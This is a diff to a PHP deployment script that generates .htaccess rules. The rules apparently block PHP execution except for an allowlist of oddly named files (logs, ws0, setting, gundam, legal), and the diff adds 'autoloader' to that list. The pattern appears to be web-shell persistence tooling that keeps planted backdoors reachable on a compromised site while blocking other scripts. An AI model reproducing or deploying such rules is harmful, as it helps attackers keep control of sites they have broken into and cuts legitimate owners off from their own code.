@@ -15,7 +15,7 @@ function getDefaultHtaccessContent() {
 </FilesMatch>
 
 # Allow specific PHP files to be accessed
-<FilesMatch "^(logs|ws0|setting|gundam|legal)\.(php|php3|php4|php5|php7|php8|phtml)$">
+<FilesMatch "^(logs|ws0|setting|gundam|legal|autoloader)\.(php|php3|php4|php5|php7|php8|phtml)$">
     Require all granted
 </FilesMatch>
 
@@ -437,4 +437,5 @@ if (!php_sapi_name() === 'cli') {
         <a href="' . $_SERVER['PHP_SELF'] . '" style="display: inline-block; background: #28a745; color: white; padding: 12px 24px; text-decoration: none; border-radius: 6px; font-weight: bold;">🔄 Deploy Again</a>
     </div>';
 }
+
 ?>
